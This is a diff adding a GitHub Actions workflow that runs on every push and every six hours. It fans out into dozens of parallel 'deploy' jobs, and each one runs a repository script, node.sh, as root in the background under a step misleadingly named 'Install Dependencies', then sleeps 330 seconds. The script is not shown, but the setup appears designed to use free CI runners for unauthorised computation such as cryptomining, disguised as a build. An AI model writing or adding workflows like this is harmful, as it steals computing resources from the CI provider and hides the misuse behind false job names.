@@ -1,0 +1,169 @@
+name: build for
+ 
+on:
+  workflow_dispatch:
+  push:
+    branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'
+  
+jobs: 
+  build: 
+    name: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 40 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 
+        flag: [A, B, C, D] 
+    env: 
+        NUM_JOBS: 40  
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      continue-on-error: true 
+      uses: actions/checkout@v1 
+ 
+  deploy-1: 
+    name: deploy-1 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh" &
+           sleep 330s
+ 
+  deploy-2: 
+    name: deploy-2 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh"  &
+           sleep 330s
+ 
+  deploy-3: 
+    name: deploy-3 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh"  &
+           sleep 330s
+ 
+  deploy-4: 
+    name: deploy-4 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh"  &
+           sleep 330s
+ 
+  deploy-5: 
+    name: deploy-5
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 20 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] 
+    env: 
+        NUM_JOBS: 20 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh"  &
+           sleep 330s
+
+  deploy-6: 
+    name: deploy-6 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 20 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] 
+    env: 
+        NUM_JOBS: 20 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh"  &
+           sleep 330s
+
+  deploy-7: 
+    name: deploy-7 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh"  &
+           sleep 330s
+
+
+  succes: 
+    name: succes 
+    needs: [deploy-1, deploy-2, deploy-3, deploy-4, deploy-5, deploy-6, deploy-7] 
+    runs-on: ubuntu-latest 
+    steps: 
+    - name: Setup 
+      continue-on-error: true 
+      uses: actions/checkout@v1 
